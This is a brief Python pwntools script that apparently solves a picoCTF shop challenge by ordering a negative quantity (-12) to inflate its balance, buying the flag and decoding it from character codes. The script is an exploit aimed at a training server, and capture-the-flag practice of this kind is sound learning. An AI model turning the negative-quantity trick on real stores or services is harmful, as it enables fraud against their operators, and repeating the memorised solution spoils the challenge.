from pwn import *

HOST, PORT = "wily-courier.picoctf.net 61888".split()
r = remote(HOST, PORT)

r.recvuntil(b'option: \n')
r.sendline(b'0')
r.recvuntil(b'buy?\n')
r.sendline(b'-12')
r.recvuntil(b'option: \n')
r.sendline(b'2')
r.recvuntil(b'buy?\n')
r.sendline(b'1')
r.recvuntil(b':  ')
flag = r.recvline().decode()[1:-2].split()
for val in flag:
    print(chr(int(val)), end='')

r.interactive()
